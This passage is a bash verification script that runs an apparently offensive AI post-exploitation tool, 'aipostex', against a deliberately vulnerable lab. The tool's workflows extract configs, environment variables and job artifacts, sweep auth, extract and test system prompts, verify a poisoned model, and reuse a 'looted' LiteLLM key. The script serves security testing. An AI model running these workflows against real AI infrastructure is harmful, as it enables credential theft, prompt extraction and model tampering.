#!/bin/bash
# verify-aipostex.sh — Layered end-to-end verification of aipostex against the lab
#
# Layers:
#   preflight   - data density and service readiness (no aipostex binary needed)
#   smoke       - reachability and service health
#   operator    - discovery and read-only exploit workflows
#   active      - gated exploit workflows with bounded proofs
#   contract    - output schema, workflow metadata, stage/landed metadata, ordering
#   sessions    - engagement auto-dossier (the flag-free attendee `sessions start` flow)
#   destructive - snapshot-gated mutation tests (requires Proxmox host)
#
# Usage:
#   bash verify-aipostex.sh
#   bash verify-aipostex.sh --layer smoke
#   bash verify-aipostex.sh --layer preflight
#   bash verify-aipostex.sh --layer destructive
#
# Environment:
#   AIPOSTEX_SKIP_ASSESS=1  Skip assess network (fingerprint + detect templates, no exploits).
#                           Use on slow links; operator/contract layers skip assess assertions when set.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
# shellcheck source=lab-scripts/lib/inventory.sh
source "${LAB_DIR}/lib/inventory.sh"
# shellcheck source=lab-scripts/lib/service-catalog.sh
source "${LAB_DIR}/lib/service-catalog.sh"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

PASS=0
FAIL=0
SKIP=0
LAYER="all"
SHOW_HELP=false
# Opt-in: set AIPOSTEX_KEEP_RESULTS=<dir> to preserve the per-command JSON outputs
# (collect-findings.sh uses this to build the scoring dataset). Default: ephemeral.
if [[ -n "${AIPOSTEX_KEEP_RESULTS:-}" ]]; then
    TMPDIR="${AIPOSTEX_KEEP_RESULTS}"
    mkdir -p "$TMPDIR"
else
    TMPDIR=$(mktemp -d)
    trap 'rm -rf "$TMPDIR"' EXIT
fi

MCP_FIXTURES="$HOME/lab/mcp-configs"
TARGET_DEV="http://$(inventory_host_ip "ailab-dev")"
TARGET_ML="http://$(inventory_host_ip "ailab-ml")"
TARGET_DS="http://$(inventory_host_ip "ailab-ds")"
TARGET_APP="http://$(inventory_host_ip "ailab-app")"
TARGET_K8S="https://$(inventory_host_ip "ailab-k8s")"
# ATTACK_IP reserved for future use
# shellcheck disable=SC2034
ATTACK_IP="$(inventory_host_ip "ailab-attack")"
TARGETS_CSV="$(inventory_target_ips_csv)"
SCAN_PORTS="${LAB_SERVICE_SCAN_PORTS}"
STDIO_MCP_SERVER="$HOME/lab/stdio-mcp-server.py"
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o BatchMode=yes"

RAY_SEED_RUN_ID=""
RAY_JOB_ID=""
GRADIO_FILE_REF=""
JUPYTER_KERNEL_ID=""
AIPOSTEX=""

usage() {
    cat <<'EOF'
Usage: bash verify-aipostex.sh [--layer preflight|smoke|operator|active|contract|sessions|destructive|all]
EOF
}

parse_args() {
    LAYER="all"
    SHOW_HELP=false

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --layer)
                if [[ $# -lt 2 || -z "${2:-}" ]]; then
                    echo "[!] --layer requires a value" >&2
                    usage >&2
                    return 2
                fi
                LAYER="$2"
                shift 2
                ;;
            -h|--help)
                usage
                SHOW_HELP=true
                return 0
                ;;
            *)
                echo "[!] Unknown argument: $1" >&2
                usage >&2
                return 2
                ;;
        esac
    done

    case "$LAYER" in
        preflight|smoke|operator|active|post-ex|sessions|contract|destructive|all) ;;
        *)
            echo "[!] Invalid layer: $LAYER" >&2
            usage >&2
            return 2
            ;;
    esac

    return 0
}

ensure_aipostex_binary() {
    if [[ "$LAYER" == "preflight" ]]; then
        AIPOSTEX=""
        return 0
    fi

    AIPOSTEX=$(command -v aipostex 2>/dev/null || echo "$HOME/aipostex")
    if [[ ! -x "$AIPOSTEX" ]]; then
        echo -e "${RED}[!] aipostex binary not found in PATH or at ~/aipostex${NC}"
        echo "    Copy the binary to the attack box first:"
        echo "    scp ./aipostex labadmin@<attack-box-ip>:~/"
        echo "    chmod +x ~/aipostex"
        return 2
    fi

    return 0
}

pass() {
    echo -e "  ${GREEN}[✓]${NC} $1"
    PASS=$((PASS + 1))
}

fail() {
    echo -e "  ${RED}[✗]${NC} $1"
    FAIL=$((FAIL + 1))
}

skip() {
    echo -e "  ${YELLOW}[skip]${NC} $1"
    SKIP=$((SKIP + 1))
}

section() {
    echo ""
    echo -e "${YELLOW}── $1 ──${NC}"
}

run_capture() {
    local name=$1 stdout_file=$2 stderr_file=$3
    shift 3
    "$@" >"$stdout_file" 2>"$stderr_file"
    local code=$?
    printf '%s' "$code" >"${stdout_file}.exit"
    return $code
}

assert_contains() {
    local test_name=$1 expected=$2 file=$3
    if grep -Fqi "$expected" "$file" 2>/dev/null; then
        pass "$test_name"
    else
        fail "$test_name — expected '$expected' in $(basename "$file")"
    fi
}

assert_not_contains() {
    local test_name=$1 expected=$2 file=$3
    if grep -Fqi "$expected" "$file" 2>/dev/null; then
        fail "$test_name — unexpected '$expected' in $(basename "$file")"
    else
        pass "$test_name"
    fi
}

assert_regex() {
    local test_name=$1 pattern=$2 file=$3
    if grep -Eqi "$pattern" "$file" 2>/dev/null; then
        pass "$test_name"
    else
        fail "$test_name — expected pattern '$pattern' in $(basename "$file")"
    fi
}

assert_jq() {
    local test_name=$1 filter=$2 file=$3
    if jq -e "$filter" "$file" >/dev/null 2>&1; then
        pass "$test_name"
    else
        fail "$test_name — jq assertion failed: $filter"
    fi
}

assert_exit_code() {
    local test_name=$1 expected=$2 actual=$3
    if [[ "$actual" -eq "$expected" ]]; then
        pass "$test_name"
    else
        fail "$test_name — expected exit $expected, got $actual"
    fi
}

assert_artifact_ok() {
    local name=$1 stdout_file=$2
    local exit_file="${stdout_file}.exit"
    local stderr_file="${stdout_file%.json}.stderr"
    if [[ ! -f "$exit_file" ]]; then
        fail "$name — no exit code recorded"
        return 1
    fi
    local code
    code=$(cat "$exit_file")
    # aipostex exit codes: 0=ok, 2=findings, 4=findings+partial
    # Codes 1 (error) and 3 (partial failure, no findings) are failures.
    if [[ "$code" -eq 0 || "$code" -eq 2 || "$code" -eq 4 ]]; then
        return 0
    fi
    local ctx=""
    if [[ -f "$stderr_file" ]]; then
        ctx=$(head -3 "$stderr_file" | tr '\n' ' ')
    fi
    fail "$name — command exited $code${ctx:+ — $ctx}"
    return 1
}

extract_jq_first() {
    local filter=$1 file=$2
    jq -r "$filter" "$file" 2>/dev/null | head -1
}

assert_workflow_read_before_gated() {
    local test_name=$1 file=$2
    local ok=1
    while IFS= read -r recs; do
        [[ -z "$recs" ]] && continue
        local seen_gated=0
        while IFS= read -r gated; do
            [[ -z "$gated" ]] && continue
            if [[ "$gated" == "true" ]]; then
                seen_gated=1
            elif [[ "$seen_gated" -eq 1 ]]; then
                ok=0
                break 2
            fi
        done < <(printf '%s\n' "$recs" | jq -r '.[] | .gated')
    done < <(jq -c '.findings[]? | .metadata.workflow.recommendations? // empty' "$file" 2>/dev/null)

    if [[ "$ok" -eq 1 ]]; then
        pass "$test_name"
    else
        fail "$test_name — found read recommendation after gated recommendation"
    fi
}

assert_count_ge() {
    local test_name=$1 expected=$2 actual=$3
    if [[ "$actual" -ge "$expected" ]]; then
        pass "$test_name ($actual >= $expected)"
    else
        fail "$test_name — got $actual, expected >= $expected"
    fi
}

# ══════════════════════════════════════════════════════════════
# PREFLIGHT — data density and service readiness (no aipostex)
# ══════════════════════════════════════════════════════════════

run_preflight_layer() {
    section "preflight (data density and service readiness)"

    local count

    # Ollama models on ailab-dev
    count=$(curl -sf "${TARGET_DEV}:11434/api/tags" 2>/dev/null | jq '.models | length' 2>/dev/null || echo 0)
    assert_count_ge "Ollama models on ailab-dev" 3 "$count"

    # ChromaDB collection count (try v2 tenant-scoped API, fall back to v1)
    count=$(curl -sf "${TARGET_ML}:8000/api/v2/tenants/default_tenant/databases/default_database/collections" 2>/dev/null \
        | jq 'length' 2>/dev/null || echo 0)
    if [[ "$count" -eq 0 ]]; then
        count=$(curl -sf "${TARGET_ML}:8000/api/v1/collections" 2>/dev/null \
            | jq 'length' 2>/dev/null || echo 0)
    fi
    assert_count_ge "ChromaDB collections" 4 "$count"

    # ChromaDB acme-knowledge-base document count
    local chroma_kb_id
    chroma_kb_id=$(curl -sf "${TARGET_ML}:8000/api/v2/tenants/default_tenant/databases/default_database/collections" 2>/dev/null \
        | jq -r '.[] | select(.name=="acme-knowledge-base") | .id' 2>/dev/null)
    if [[ -n "$chroma_kb_id" ]]; then
        count=$(curl -sf "${TARGET_ML}:8000/api/v2/tenants/default_tenant/databases/default_database/collections/${chroma_kb_id}/count" 2>/dev/null || echo 0)
    else
        chroma_kb_id=$(curl -sf "${TARGET_ML}:8000/api/v1/collections" 2>/dev/null \
            | jq -r '.[] | select(.name=="acme-knowledge-base") | .id' 2>/dev/null)
        if [[ -n "$chroma_kb_id" ]]; then
            count=$(curl -sf "${TARGET_ML}:8000/api/v1/collections/${chroma_kb_id}/count" 2>/dev/null || echo 0)
        else
            count=0
        fi
    fi
    assert_count_ge "ChromaDB acme-knowledge-base documents" 150 "$count"

    # Weaviate ResearchDocument object count
    count=$(curl -sf "${TARGET_DS}:8080/v1/objects?class=ResearchDocument&limit=200" 2>/dev/null \
        | jq '.objects | length' 2>/dev/null || echo 0)
    if [[ "$count" -eq 0 ]]; then
        count=$(curl -sf "${TARGET_DS}:8080/v1/objects?class=ResearchDocument&limit=1&include=vector" 2>/dev/null \
            | jq '.totalResults // 0' 2>/dev/null || echo 0)
    fi
    assert_count_ge "Weaviate ResearchDocument objects" 150 "$count"

    # Qdrant security-findings point count
    count=$(curl -sf "${TARGET_DS}:6333/collections/security-findings" 2>/dev/null \
        | jq '.result.points_count // 0' 2>/dev/null || echo 0)
    assert_count_ge "Qdrant security-findings points" 150 "$count"

    # LiteLLM open instance
    local litellm_health
    litellm_health=$(curl -sf "${TARGET_ML}:4000/health" 2>/dev/null || echo "")
    if echo "$litellm_health" | grep -qi "healthy\|model"; then
        pass "LiteLLM :4000 /health returns backend info"
    else
        fail "LiteLLM :4000 /health not returning expected data"
    fi

    # LiteLLM /v1/model/info
    local model_info
    model_info=$(curl -sf "${TARGET_ML}:4000/v1/model/info" 2>/dev/null || echo "")
    if echo "$model_info" | grep -qi "model_name\|litellm_params"; then
        pass "LiteLLM :4000 /v1/model/info returns model configs"
    else
        fail "LiteLLM :4000 /v1/model/info not returning model configs"
    fi

    # LiteLLM authenticated instance rejects unauthenticated requests
    local authed_nokey
    authed_nokey=$(curl -sf "${TARGET_ML}:4001/health" 2>/dev/null || echo "REJECTED")
    local authed_withkey
    authed_withkey=$(curl -sf -H "Authorization: Bearer sk-litellm-lab-auth-key-FAKE123" \
        "${TARGET_ML}:4001/health" 2>/dev/null || echo "")
    if [[ "$authed_nokey" == "REJECTED" ]] || echo "$authed_nokey" | grep -qi "authentication\|unauthorized"; then
        pass "LiteLLM :4001 rejects unauthenticated requests"
    else
        fail "LiteLLM :4001 should reject unauthenticated requests"
    fi
    if echo "$authed_withkey" | grep -qi "healthy\|model"; then
        pass "LiteLLM :4001 accepts authenticated requests"
    else
        fail "LiteLLM :4001 not responding to authenticated requests"
    fi

    # Ray seeded jobs
    count=$(curl -sf "${TARGET_ML}:8265/api/jobs/" 2>/dev/null | jq 'length' 2>/dev/null || echo 0)
    assert_count_ge "Ray seeded jobs" 3 "$count"

    # MLflow registered models
    count=$(curl -sf "${TARGET_ML}:5000/api/2.0/mlflow/registered-models/search" 2>/dev/null \
        | jq '.registered_models | length' 2>/dev/null || echo 0)
    assert_count_ge "MLflow registered models" 2 "$count"

    # Gradio queue and endpoints
    local gradio_config
    gradio_config=$(curl -sf "${TARGET_DEV}:7860/config" 2>/dev/null || echo "")
    if echo "$gradio_config" | jq -e '.components' >/dev/null 2>&1; then
        pass "Gradio :7860 exposes expected API endpoints"
    else
        fail "Gradio :7860 missing expected API endpoints"
    fi

    local langserve_docs streamlit_health
    langserve_docs=$(curl -sf "${TARGET_APP}:8090/docs" 2>/dev/null || echo "")
    if echo "$langserve_docs" | grep -qi "LangServe\|Swagger"; then
        pass "LangServe :8090 docs are reachable"
    else
        fail "LangServe :8090 docs not returning expected content"
    fi

    streamlit_health=$(curl -sf "${TARGET_APP}:8501/_stcore/health" 2>/dev/null || echo "")
    if echo "$streamlit_health" | grep -qi "ok"; then
        pass "Streamlit :8501 health is reachable"
    else
        fail "Streamlit :8501 health not returning ok"
    fi

    # W&B mock on ailab-ml
    local wandb_health
    wandb_health=$(curl -sf "${TARGET_ML}:8444/healthz" 2>/dev/null || echo "")
    if echo "$wandb_health" | grep -qi "wandb"; then
        pass "W&B mock :8444 /healthz is reachable"
    else
        fail "W&B mock :8444 /healthz not returning expected data"
    fi

    count=$(curl -sf -X POST "${TARGET_ML}:8444/graphql" \
        -H "Content-Type: application/json" \
        -d '{"query":"query Projects($entity: String!, $perPage: Int = 20) { models(entityName: $entity, first: $perPage) { edges { node { id name entityName } } } }","variables":{"entity":"acme-ml-team","perPage":20}}' 2>/dev/null \
        | jq '.data.models.edges | length' 2>/dev/null || echo 0)
    assert_count_ge "W&B mock projects" 2 "$count"

    # A2A seeded tasks
    count=$(curl -sf "${TARGET_APP}:8100/.well-known/agent-card.json" 2>/dev/null \
        | jq '.skills | length' 2>/dev/null || echo 0)
    assert_count_ge "A2A agent skills" 4 "$count"
}


# ══════════════════════════════════════════════════════════════
# SMOKE — reachability and service health
# ══════════════════════════════════════════════════════════════

run_smoke_layer() {
    section "smoke"
    local host_alias port path expect name header host output
    while IFS='|' read -r host_alias port path expect name header; do
        host=$(inventory_host_ip "${host_alias}")
        local -a curl_args=(curl -sf --max-time 6)
        if [[ -n "${header}" ]]; then
            curl_args+=(-H "${header}")
        fi
        if [[ "$path" == "/mcp" ]]; then
            # Real MCP (Streamable HTTP) server: no GET health route. Probe with a
            # POST initialize; the SSE-framed reply still carries serverInfo.
            output=$("${curl_args[@]}" -X POST \
                -H 'Content-Type: application/json' \
                -H 'Accept: application/json, text/event-stream' \
                -d '{"jsonrpc":"2.0","id":"1","method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"verify","version":"1"}}}' \
                "http://$host:$port$path" 2>/dev/null || true)
        else
            output=$("${curl_args[@]}" "http://$host:$port$path" 2>/dev/null || true)
        fi
        if echo "$output" | grep -Fqi "$expect"; then
            pass "$name reachable"
        else
            fail "$name reachable — expected '$expect' from http://$host:$port$path"
        fi
    done < <(inventory_service_health_checks)
}


# ══════════════════════════════════════════════════════════════
# OPERATOR — discovery and read-only exploit workflows
# ══════════════════════════════════════════════════════════════

load_seeded_ray_run_id() {
    local metadata_json
    metadata_json=$(ssh $SSH_OPTS "labadmin@$(inventory_host_ip "ailab-ml")" "cat /opt/ray/seed-run.json" 2>/dev/null || true)
    if [[ -n "$metadata_json" ]]; then
        RAY_SEED_RUN_ID=$(printf '%s' "$metadata_json" | jq -r '.seed_run_id // empty' 2>/dev/null || true)
    fi
}

select_seeded_ray_job_id() {
    local jobs_file=$1
    local selected_job_id=""

    if [[ -n "$RAY_SEED_RUN_ID" ]]; then
        selected_job_id=$(jq -r --arg seed_run_id "$RAY_SEED_RUN_ID" '
            [
                .findings[]?
                | select(
                    (
                        .metadata.seed_run_id? == $seed_run_id
                        or .metadata.job_metadata.seed_run_id? == $seed_run_id
                    )
                    and (
                        .metadata.name == "runtime-env-validator"
                        or .metadata.name == "churn-model-retraining"
                    )
                )
            ]
            | first
            | .metadata.job_id // empty
        ' "$jobs_file" 2>/dev/null)
    fi

    if [[ -z "$selected_job_id" || "$selected_job_id" == "null" ]]; then
        selected_job_id=$(jq -r '
            [
                .findings[]?
                | select(.metadata.name == "runtime-env-validator" or .metadata.name == "churn-model-retraining")
            ]
            | first
            | .metadata.job_id // empty
        ' "$jobs_file" 2>/dev/null)
    fi

    if [[ -z "$selected_job_id" || "$selected_job_id" == "null" ]]; then
        selected_job_id=$(extract_jq_first '.findings[]? | .metadata.job_id? // empty' "$jobs_file")
    fi

    printf '%s' "$selected_job_id"
}

prepare_read_only_artifacts() {
    local stdout_file stderr_file

    stdout_file="$TMPDIR/scan-network.json"
    stderr_file="$TMPDIR/scan-network.stderr"
    run_capture "scan-network" "$stdout_file" "$stderr_file" \
        "$AIPOSTEX" discover network \
        --target "$TARGETS_CSV" \
        --ports "$SCAN_PORTS" \
        --mode detect \
        --format json

    if [[ "${AIPOSTEX_SKIP_ASSESS:-}" != "1" ]]; then
        run_capture "assess-network" "$TMPDIR/assess-network.json" "$TMPDIR/assess-network.stderr" \
            "$AIPOSTEX" assess network \
            --target "$TARGETS_CSV" \
            --ports "$SCAN_PORTS" \
            --mode detect \
            --skip-exploit \
            --format json
    fi

    run_capture "scan-targets-ollama" "$TMPDIR/scan-targets-ollama.json" "$TMPDIR/scan-targets-ollama.stderr" \
        "$AIPOSTEX" scan targets --target "${TARGET_DEV}:11434" --mode detect --format json

    run_capture "request-top-ray-jobs" "$TMPDIR/request-top-ray-jobs.json" "$TMPDIR/request-top-ray-jobs.stderr" \
        "$AIPOSTEX" request --target "$TARGET_ML:8265" GET /api/jobs/ --format json

    if [[ -d "$MCP_FIXTURES" ]]; then
        run_capture "scan-files" "$TMPDIR/scan-files.json" "$TMPDIR/scan-files.stderr" \
            "$AIPOSTEX" discover files --path "$MCP_FIXTURES" --format json
    fi

    if [[ -f "$MCP_FIXTURES/remote_mcp_chain.json" ]]; then
        run_capture "mcp-analyze" "$TMPDIR/mcp-analyze.json" "$TMPDIR/mcp-analyze.stderr" \
            "$AIPOSTEX" mcp analyze --config "$MCP_FIXTURES/remote_mcp_chain.json" --format json
    fi

    run_capture "mcp-enum" "$TMPDIR/mcp-enum.json" "$TMPDIR/mcp-enum.stderr" \
        "$AIPOSTEX" mcp --target "$TARGET_DEV:3000" enum --format json

    if [[ -f "$STDIO_MCP_SERVER" ]]; then
        run_capture "mcp-stdio-enum" "$TMPDIR/mcp-stdio-enum.json" "$TMPDIR/mcp-stdio-enum.stderr" \
            "$AIPOSTEX" mcp --transport stdio --stdio-command python3 --stdio-args "$STDIO_MCP_SERVER" enum --format json
    fi

    run_capture "oai-auth-sweep" "$TMPDIR/oai-auth-sweep.json" "$TMPDIR/oai-auth-sweep.stderr" \
        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" auth-sweep --format json

    run_capture "oai-enum" "$TMPDIR/oai-enum.json" "$TMPDIR/oai-enum.stderr" \
        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" enum --format json

    run_capture "oai-validate" "$TMPDIR/oai-validate.json" "$TMPDIR/oai-validate.stderr" \
        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" validate-inference --model local-smollm --format json

    run_capture "litellm-probe" "$TMPDIR/litellm-probe.json" "$TMPDIR/litellm-probe.stderr" \
        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" litellm-probe --format json

    # LiteLLM dedicated module
    run_capture "litellm-enum" "$TMPDIR/litellm-enum.json" "$TMPDIR/litellm-enum.stderr" \
        "$AIPOSTEX" litellm --target "$TARGET_ML:4000" enum --format json

    run_capture "litellm-config-extract" "$TMPDIR/litellm-config-extract.json" "$TMPDIR/litellm-config-extract.stderr" \
        "$AIPOSTEX" litellm --target "$TARGET_ML:4000" config-extract --format json

    run_capture "litellm-budget-probe" "$TMPDIR/litellm-budget-probe.json" "$TMPDIR/litellm-budget-probe.stderr" \
        "$AIPOSTEX" litellm --target "$TARGET_ML:4000" budget-probe --format json

    # Exercise the looted-key climax path: authed :4001 with the master key, not the open :4000.
    run_capture "litellm-proxy-chain" "$TMPDIR/litellm-proxy-chain.json" "$TMPDIR/litellm-proxy-chain.stderr" \
        "$AIPOSTEX" litellm --target "$TARGET_ML:4001" --header "Authorization: Bearer sk-litellm-lab-auth-key-FAKE123" proxy-chain --relay-test --format json

    run_capture "oai-prompt-extract" "$TMPDIR/oai-prompt-extract.json" "$TMPDIR/oai-prompt-extract.stderr" \
        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" prompt-extract \
        --model local-smollm --format json

    run_capture "oai-tool-enum" "$TMPDIR/oai-tool-enum.json" "$TMPDIR/oai-tool-enum.stderr" \
        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" tool-enum \
        --model local-smollm --format json

    run_capture "oai-prompt-test" "$TMPDIR/oai-prompt-test.json" "$TMPDIR/oai-prompt-test.stderr" \
        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" prompt-test \
        --model local-smollm --format json

    run_capture "ray-enum" "$TMPDIR/ray-enum.json" "$TMPDIR/ray-enum.stderr" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" enum --format json

    run_capture "ray-jobs" "$TMPDIR/ray-jobs.json" "$TMPDIR/ray-jobs.stderr" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" jobs --format json
    load_seeded_ray_run_id
    RAY_JOB_ID=$(select_seeded_ray_job_id "$TMPDIR/ray-jobs.json")

    if [[ -n "$RAY_JOB_ID" ]]; then
        run_capture "ray-job-logs" "$TMPDIR/ray-job-logs.json" "$TMPDIR/ray-job-logs.stderr" \
            "$AIPOSTEX" ray --target "$TARGET_ML:8265" job-logs --job-id "$RAY_JOB_ID" --format json

        run_capture "ray-job-artifacts" "$TMPDIR/ray-job-artifacts.json" "$TMPDIR/ray-job-artifacts.stderr" \
            "$AIPOSTEX" ray --target "$TARGET_ML:8265" job-artifacts --job-id "$RAY_JOB_ID" --format json
    fi

    run_capture "mlflow-enum" "$TMPDIR/mlflow-enum.json" "$TMPDIR/mlflow-enum.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" enum --format json

    run_capture "mlflow-experiments" "$TMPDIR/mlflow-experiments.json" "$TMPDIR/mlflow-experiments.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" experiments --format json

    local mlflow_exp_ids
    mlflow_exp_ids=$(jq -r '[.findings[]? | select(.metadata.run_count > 0) | .metadata.id] | join(" ")' "$TMPDIR/mlflow-experiments.json" 2>/dev/null)
    local mlflow_exp_idx=0
    for mlflow_experiment_id in $mlflow_exp_ids; do
        local suffix=""
        [[ $mlflow_exp_idx -gt 0 ]] && suffix="-${mlflow_exp_idx}"
        run_capture "mlflow-runs${suffix}" "$TMPDIR/mlflow-runs${suffix}.json" "$TMPDIR/mlflow-runs${suffix}.stderr" \
            "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" runs \
            --experiment "$mlflow_experiment_id" --format json
        mlflow_exp_idx=$((mlflow_exp_idx + 1))
    done

    local mlflow_run_id
    mlflow_run_id=$(cat "$TMPDIR"/mlflow-runs*.json 2>/dev/null | jq -r '.findings[]? | select(.metadata.run_id != null) | .metadata.run_id' 2>/dev/null | head -1)
    if [[ -n "$mlflow_run_id" && "$mlflow_run_id" != "null" ]]; then
        run_capture "mlflow-artifacts" "$TMPDIR/mlflow-artifacts.json" "$TMPDIR/mlflow-artifacts.stderr" \
            "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" artifacts \
            --run-id "$mlflow_run_id" --format json
    fi

    run_capture "mlflow-registry" "$TMPDIR/mlflow-registry.json" "$TMPDIR/mlflow-registry.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" registry --format json

    run_capture "mlflow-model-versions" "$TMPDIR/mlflow-model-versions.json" "$TMPDIR/mlflow-model-versions.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" model-versions --model acme-churn-ensemble --format json

    run_capture "mlflow-model-artifacts" "$TMPDIR/mlflow-model-artifacts.json" "$TMPDIR/mlflow-model-artifacts.stderr" \
        "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" model-artifacts --model acme-fraud-bert --format json

    local mlflow_download_run_ids
    mlflow_download_run_ids=$(cat "$TMPDIR"/mlflow-runs*.json 2>/dev/null | jq -r '.findings[]? | select(.metadata.run_id != null) | .metadata.run_id' 2>/dev/null | sort -u | tr '\n' ' ')
    local dl_idx=0
    for dl_run_id in $mlflow_download_run_ids; do
        # MLmodel first: every seeded run has it, so the first capture (which the
        # assertion checks) always exercises a present artifact regardless of run
        # ordering — model/config.json only exists on some runs (a 404 on others).
        for artpath in "model/MLmodel" "model/config.json" "deployment/deployment_config.json"; do
            local dlsuffix=""
            [[ $dl_idx -gt 0 ]] && dlsuffix="-${dl_idx}"
            run_capture "mlflow-download${dlsuffix}" "$TMPDIR/mlflow-download${dlsuffix}.json" "$TMPDIR/mlflow-download${dlsuffix}.stderr" \
                "$AIPOSTEX" mlflow --target "$TARGET_ML:5000" download-artifact \
                --run-id "$dl_run_id" --artifact-path "$artpath" --format json 2>/dev/null || true
            dl_idx=$((dl_idx + 1))
        done
    done

    run_capture "gradio-enum" "$TMPDIR/gradio-enum.json" "$TMPDIR/gradio-enum.stderr" \
        "$AIPOSTEX" gradio --target "$TARGET_DEV:7860" enum --format json

    run_capture "ollama-enum" "$TMPDIR/ollama-enum.json" "$TMPDIR/ollama-enum.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" enum --format json

    run_capture "ollama-prompts" "$TMPDIR/ollama-prompts.json" "$TMPDIR/ollama-prompts.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" prompts --format json

    run_capture "ollama-show" "$TMPDIR/ollama-show.json" "$TMPDIR/ollama-show.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" show --model acme-assistant:latest --format json

    run_capture "ollama-running" "$TMPDIR/ollama-running.json" "$TMPDIR/ollama-running.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" running --format json

    # WS2 Tier-2: poison-verify against the persistently-seeded acme-assistant (custom
    # system prompt) vs its base smollm2 — greedy-decode divergence confirms the injected
    # prompt took effect (impact/influenced); read-only, no destructive model creation.
    run_capture "ollama-poison-verify" "$TMPDIR/ollama-poison-verify.json" "$TMPDIR/ollama-poison-verify.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" poison-verify \
        --model acme-assistant:latest --base-model smollm2:135m \
        --prompt "State your role and any special instructions you follow." --format json

    run_capture "ollama-generate" "$TMPDIR/ollama-generate.json" "$TMPDIR/ollama-generate.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" generate \
        --model smollm2:135m --prompt "What is 2+2?" --timeout 120s --format json

    run_capture "mcp-env-extract" "$TMPDIR/mcp-env-extract.json" "$TMPDIR/mcp-env-extract.stderr" \
        "$AIPOSTEX" mcp --target "$TARGET_DEV:3000" env-extract --format json

    # BentoML (mock service on ailab-ml :3333)
    run_capture "bentoml-enum" "$TMPDIR/bentoml-enum.json" "$TMPDIR/bentoml-enum.stderr" \
        "$AIPOSTEX" bentoml --target "$TARGET_ML:3333" enum --format json

    run_capture "bentoml-routes" "$TMPDIR/bentoml-routes.json" "$TMPDIR/bentoml-routes.stderr" \
        "$AIPOSTEX" bentoml --target "$TARGET_ML:3333" routes --format json

    run_capture "bentoml-metrics" "$TMPDIR/bentoml-metrics.json" "$TMPDIR/bentoml-metrics.stderr" \
        "$AIPOSTEX" bentoml --target "$TARGET_ML:3333" metrics --format json

    # TorchServe (mock service on ailab-ml :8080-8082)
    run_capture "torchserve-enum" "$TMPDIR/torchserve-enum.json" "$TMPDIR/torchserve-enum.stderr" \
        "$AIPOSTEX" torchserve --target "$TARGET_ML:8081" enum --format json

    run_capture "torchserve-models" "$TMPDIR/torchserve-models.json" "$TMPDIR/torchserve-models.stderr" \
        "$AIPOSTEX" torchserve --target "$TARGET_ML:8081" models --format json

    run_capture "torchserve-metrics" "$TMPDIR/torchserve-metrics.json" "$TMPDIR/torchserve-metrics.stderr" \
        "$AIPOSTEX" torchserve --target "$TARGET_ML:8081" metrics --format json

    # Triton (mock service on ailab-ml :8500)
    run_capture "triton-enum" "$TMPDIR/triton-enum.json" "$TMPDIR/triton-enum.stderr" \
        "$AIPOSTEX" triton --target "$TARGET_ML:8500" enum --format json

    run_capture "triton-models" "$TMPDIR/triton-models.json" "$TMPDIR/triton-models.stderr" \
        "$AIPOSTEX" triton --target "$TARGET_ML:8500" models --format json

    run_capture "triton-model-config" "$TMPDIR/triton-model-config.json" "$TMPDIR/triton-model-config.stderr" \
        "$AIPOSTEX" triton --target "$TARGET_ML:8500" model-config \
        --model acme-fraud-detector --format json

    run_capture "triton-shm-probe" "$TMPDIR/triton-shm-probe.json" "$TMPDIR/triton-shm-probe.stderr" \
        "$AIPOSTEX" triton --target "$TARGET_ML:8500" shm-probe --format json

    # TF Serving (mock service on ailab-ml :8501)
    run_capture "tfserving-enum" "$TMPDIR/tfserving-enum.json" "$TMPDIR/tfserving-enum.stderr" \
        "$AIPOSTEX" tfserving --target "$TARGET_ML:8501" enum --format json

    run_capture "tfserving-models" "$TMPDIR/tfserving-models.json" "$TMPDIR/tfserving-models.stderr" \
        "$AIPOSTEX" tfserving --target "$TARGET_ML:8501" models --format json

    run_capture "tfserving-metadata" "$TMPDIR/tfserving-metadata.json" "$TMPDIR/tfserving-metadata.stderr" \
        "$AIPOSTEX" tfserving --target "$TARGET_ML:8501" metadata \
        --model acme-fraud-scorer --format json

    run_capture "tfserving-metrics" "$TMPDIR/tfserving-metrics.json" "$TMPDIR/tfserving-metrics.stderr" \
        "$AIPOSTEX" tfserving --target "$TARGET_ML:8501" metrics --format json

    # W&B (mock service on ailab-ml :8444)
    run_capture "wandb-enum" "$TMPDIR/wandb-enum.json" "$TMPDIR/wandb-enum.stderr" \
        "$AIPOSTEX" wandb --target "$TARGET_ML:8444" enum --format json

    run_capture "wandb-projects" "$TMPDIR/wandb-projects.json" "$TMPDIR/wandb-projects.stderr" \
        "$AIPOSTEX" wandb --target "$TARGET_ML:8444" projects --entity acme-ml-team --format json

